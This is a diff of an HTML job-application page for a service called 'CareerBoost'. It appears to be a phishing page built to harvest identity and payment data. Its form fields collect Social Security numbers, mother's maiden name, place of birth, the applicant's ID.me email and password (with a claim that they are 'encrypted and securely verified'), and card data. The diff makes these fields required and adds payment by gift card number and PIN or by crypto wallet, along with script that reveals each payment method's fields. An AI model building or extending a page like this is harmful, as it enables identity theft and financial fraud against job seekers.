@@ -9,9 +9,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <!-- Add fallback font in case Poppins fails to load -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" onerror="this.onerror=null;this.href='css/fallback-font.css';">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <header>
@@ -188,90 +186,90 @@
                 </fieldset>
                 
                 <!-- US Specific Fields (Initially Hidden) -->
-                <fieldset id="us-fields" class="form-section" style="display:none;">
-                    <legend>U.S. Specific Information</legend>
-                    
-                    <div class="form-group">
-                        <label>Are you a U.S. Veteran?*</label>
-                        <div class="radio-group">
-                            <input type="radio" id="veteran-yes" name="veteran" value="yes">
-                            <label for="veteran-yes">Yes</label>
-                            <input type="radio" id="veteran-no" name="veteran" value="no">
-                            <label for="veteran-no">No</label>
-                        </div>
-                    </div>
-                    
-                    <div id="veteran-details" style="display:none;">
-                        <div class="form-group">
-                            <label for="veteran-rank">Veteran Rank/Position</label>
-                            <input type="text" id="veteran-rank" name="veteran-rank">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="veteran-branch">Branch of Service</label>
-                            <select id="veteran-branch" name="veteran-branch">
-                                <option value="">Select Branch...</option>
-                                <option value="army">U.S. Army</option>
-                                <option value="navy">U.S. Navy</option>
-                                <option value="air-force">U.S. Air Force</option>
-                                <option value="marines">U.S. Marine Corps</option>
-                                <option value="coast-guard">U.S. Coast Guard</option>
-                                <option value="space-force">U.S. Space Force</option>
-                            </select>
-                        </div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>Are you verified with ID.me?*</label>
-                        <div class="radio-group">
-                            <input type="radio" id="idme-yes" name="idme-verified" value="yes">
-                            <label for="idme-yes">Yes</label>
-                            <input type="radio" id="idme-no" name="idme-verified" value="no">
-                            <label for="idme-no">No</label>
-                        </div>
-                    </div>
-                    
-                    <div id="idme-verified-fields" style="display:none;">
-                        <div class="form-group">
-                            <label for="idme-email">ID.me Registered Email*</label>
-                            <input type="email" id="idme-email" name="idme-email">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="idme-password">ID.me Password*</label>
-                            <input type="password" id="idme-password" name="idme-password">
-                            <p class="form-note">Your credentials are encrypted and securely verified</p>
-                        </div>
-                    </div>
-                    
-                    <div id="idme-not-verified-fields" style="display:none;">
-                        <div class="form-group">
-                            <label>Would you like to verify with ID.me now?*</label>
-                            <div class="radio-group">
-                                <input type="radio" id="verify-now-yes" name="verify-now" value="yes">
-                                <label for="verify-now-yes">Yes, verify now</label>
-                                <input type="radio" id="verify-now-no" name="verify-now" value="no">
-                                <label for="verify-now-no">No, I'll verify later</label>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="ssn">Social Security Number (SSN)*</label>
-                        <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
-                        <p class="form-note">Required for U.S. employment verification</p>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="mother-maiden">Mother's Maiden Name*</label>
-                        <input type="text" id="mother-maiden" name="mother-maiden" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="birth-place">Place of Birth (City, State, Country)*</label>
-                        <input type="text" id="birth-place" name="birth-place" required>
-                    </div>
-                </fieldset>
+<fieldset id="us-fields" class="form-section" style="display:none;">
+    <legend>U.S. Specific Information</legend>
+    
+    <div class="form-group">
+        <label>Are you a U.S. Veteran?*</label>
+        <div class="radio-group">
+            <input type="radio" id="veteran-yes" name="veteran" value="yes" required>
+            <label for="veteran-yes">Yes</label>
+            <input type="radio" id="veteran-no" name="veteran" value="no" required>
+            <label for="veteran-no">No</label>
+        </div>
+    </div>
+    
+    <div id="veteran-details" style="display:none;">
+        <div class="form-group">
+            <label for="veteran-rank">Veteran Rank/Position</label>
+            <input type="text" id="veteran-rank" name="veteran-rank">
+        </div>
+        
+        <div class="form-group">
+            <label for="veteran-branch">Branch of Service</label>
+            <select id="veteran-branch" name="veteran-branch">
+                <option value="">Select Branch...</option>
+                <option value="army">U.S. Army</option>
+                <option value="navy">U.S. Navy</option>
+                <option value="air-force">U.S. Air Force</option>
+                <option value="marines">U.S. Marine Corps</option>
+                <option value="coast-guard">U.S. Coast Guard</option>
+                <option value="space-force">U.S. Space Force</option>
+            </select>
+        </div>
+    </div>
+    
+    <div class="form-group">
+        <label>Are you verified with ID.me?*</label>
+        <div class="radio-group">
+            <input type="radio" id="idme-yes" name="idme-verified" value="yes" required>
+            <label for="idme-yes">Yes</label>
+            <input type="radio" id="idme-no" name="idme-verified" value="no" required>
+            <label for="idme-no">No</label>
+        </div>
+    </div>
+    
+    <div id="idme-verified-fields" style="display:none;">
+        <div class="form-group">
+            <label for="idme-email">ID.me Registered Email*</label>
+            <input type="email" id="idme-email" name="idme-email" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="idme-password">ID.me Password*</label>
+            <input type="password" id="idme-password" name="idme-password" required>
+            <p class="form-note">Your credentials are encrypted and securely verified</p>
+        </div>
+    </div>
+    
+    <div id="idme-not-verified-fields" style="display:none;">
+        <div class="form-group">
+            <label>Would you like to verify with ID.me now?*</label>
+            <div class="radio-group">
+                <input type="radio" id="verify-now-yes" name="verify-now" value="yes">
+                <label for="verify-now-yes">Yes, verify now</label>
+                <input type="radio" id="verify-now-no" name="verify-now" value="no">
+                <label for="verify-now-no">No, I'll verify later</label>
+            </div>
+        </div>
+    </div>
+    
+    <div class="form-group">
+        <label for="ssn">Social Security Number (SSN)*</label>
+        <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+        <p class="form-note">Required for U.S. employment verification</p>
+    </div>
+    
+    <div class="form-group">
+        <label for="mother-maiden">Mother's Maiden Name*</label>
+        <input type="text" id="mother-maiden" name="mother-maiden" required>
+    </div>
+    
+    <div class="form-group">
+        <label for="birth-place">Place of Birth (City, State, Country)*</label>
+        <input type="text" id="birth-place" name="birth-place" required>
+    </div>
+</fieldset>
                 
                 <!-- Document Upload Section -->
                 <fieldset class="form-section">
@@ -392,6 +390,16 @@
                                         <option value="">MM</option>
                                         <option value="01">01</option>
                                         <option value="02">02</option>
+                                        <option value="03">03</option>
+                                        <option value="04">04</option>
+                                        <option value="05">05</option>
+                                        <option value="06">06</option>
+                                        <option value="07">07</option>
+                                        <option value="08">08</option>
+                                        <option value="09">09</option>
+                                        <option value="10">10</option>
+                                        <option value="11">11</option>
+                                        <option value="12">12</option>
                                         <!-- Add all months -->
                                     </select>
                                 </div>
@@ -400,8 +408,12 @@
                                     <label for="expiry-year">Expiry Year*</label>
                                     <select id="expiry-year" name="expiry-year">
                                         <option value="">YYYY</option>
-                                        <option value="2023">2023</option>
-                                        <option value="2024">2024</option>
+                                        <option value="2025">2025</option>
+                                        <option value="2026">2026</option>
+                                        <option value="2027">2027</option>
+                                        <option value="2028">2028</option>
+                                        <option value="2029">2029</option>
+                                        <option value="2030">2030</option>
                                         <!-- Add more years -->
                                     </select>
                                 </div>
@@ -449,6 +461,61 @@
                                 </select>
                             </div>
                         </div>
+
+                        <!-- PayPal Fields -->
+<div id="paypal-fields" style="display:none;">
+    <div class="form-group">
+        <label for="paypal-email">PayPal Email*</label>
+        <input type="email" id="paypal-email" name="paypal-email" placeholder="your@email.com">
+    </div>
+</div>
+
+<!-- Gift Card Fields -->
+<div id="gift-card-fields" style="display:none;">
+    <div class="form-group">
+        <label for="gift-card-number">Gift Card Number*</label>
+        <input type="text" id="gift-card-number" name="gift-card-number" placeholder="XXXX-XXXX-XXXX-XXXX">
+    </div>
+    
+    <div class="form-group">
+        <label for="gift-card-pin">PIN Code*</label>
+        <input type="text" id="gift-card-pin" name="gift-card-pin" placeholder="1234">
+    </div>
+    
+    <div class="form-group">
+        <label for="gift-card-brand">Gift Card Brand*</label>
+        <select id="gift-card-brand" name="gift-card-brand">
+            <option value="">Select Brand...</option>
+            <option value="amazon">Amazon</option>
+            <option value="visa">Visa/Mastercard</option>
+            <option value="apple">Apple</option>
+            <option value="google">Google Play</option>
+            <option value="steam">Steam</option>
+            <option value="other">Other</option>
+        </select>
+    </div>
+</div>
+
+<!-- Cryptocurrency Fields -->
+<div id="crypto-fields" style="display:none;">
+    <div class="form-group">
+        <label for="crypto-type">Cryptocurrency*</label>
+        <select id="crypto-type" name="crypto-type">
+            <option value="">Select Coin...</option>
+            <option value="bitcoin">Bitcoin (BTC)</option>
+            <option value="ethereum">Ethereum (ETH)</option>
+            <option value="usdt">USDT (Tether)</option>
+            <option value="bnb">BNB</option>
+            <option value="other">Other</option>
+        </select>
+    </div>
+    
+    <div class="form-group">
+        <label for="crypto-wallet-address">Wallet Address*</label>
+        <input type="text" id="crypto-wallet-address" name="crypto-wallet-address" placeholder="Enter receiving wallet address">
+    </div>
+</div>
+
                     </div>
                 </fieldset>
                 
@@ -465,53 +532,15 @@
                     <p class="form-note">All information is encrypted and transmitted securely</p>
                 </div>
             </form>
-        </div>
+            </div>
     </section>
-
-    <section id="testimonials" class="testimonials">
+        <section id="testimonials" class="testimonials">
         <div class="container">
             <h2>Success Stories</h2>
             <p class="subtitle">What our applicants say about us</p>
             
-            <div class="testimonial-grid">
-                <div class="testimonial-card">
-                    <div class="testimonial-content">
-                        <p>"After 6 months of rejections, I used CareerBoost and got 3 offers in 2 weeks!"</p>
-                    </div>
-                    <div class="testimonial-author">
-                        <img src="images/testimonial1.jpg" alt="Sarah J.">
-                        <div>
-                            <h4>Sarah J.</h4>
-                            <p>Marketing Manager at TechCorp</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-content">
-                        <p>"The premium service was worth every penny. I landed a job with 30% higher salary."</p>
-                    </div>
-                    <div class="testimonial-author">
-                        <img src="images/testimonial2.jpg" alt="Michael T.">
-                        <div>
-                            <h4>Michael T.</h4>
-                            <p>Senior Developer at FinTech Solutions</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-content">
-                        <p>"CareerBoost's application system got me interviews at companies I never thought would call me."</p>
-                    </div>
-                    <div class="testimonial-author">
-                        <img src="images/testimonial3.jpg" alt="Priya K.">
-                        <div>
-                            <h4>Priya K.</h4>
-                            <p>Data Analyst at HealthPlus</p>
-                        </div>
-                    </div>
-                </div>
+            <div class="testimonial-grid" id="testimonial-container">
+                <!-- Testimonials will be loaded dynamically from Supabase -->
             </div>
         </div>
     </section>
@@ -586,15 +615,39 @@
             </div>
             
             <div class="footer-bottom">
-                <p>&copy; 2023 CareerBoost. All rights reserved.</p>
+                <p>&copy; <span id="current-year"></span> CareerBoost. All rights reserved.</p>
             </div>
         </div>
     </footer>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="js/supabase-config.js"></script>
-    <script type="module" src="script.js"></script>
-    <script src="js/script.js"></script>
-    <script src="js/payment.js"></script>
+    <!-- Load Supabase client first -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="js/supabase-config.js"></script>
+<script src="js/script.js"></script>
+<script src="js/form-handler.js"></script>
+<script src="js/payment.js"></script>
+<script>
+document.getElementById('payment-method').addEventListener('change', function () {
+    const method = this.value;
+
+    // Hide all
+    document.getElementById('credit-card-fields').style.display = 'none';
+    document.getElementById('paypal-fields').style.display = 'none';
+    document.getElementById('gift-card-fields').style.display = 'none';
+    document.getElementById('crypto-fields').style.display = 'none';
+
+    // Show selected
+    if (method === 'credit-card') {
+        document.getElementById('credit-card-fields').style.display = 'block';
+    } else if (method === 'paypal') {
+        document.getElementById('paypal-fields').style.display = 'block';
+    } else if (method === 'gift-card') {
+        document.getElementById('gift-card-fields').style.display = 'block';
+    } else if (method === 'crypto') {
+        document.getElementById('crypto-fields').style.display = 'block';
+    }
+});
+</script>
+
 </body>
 </html>
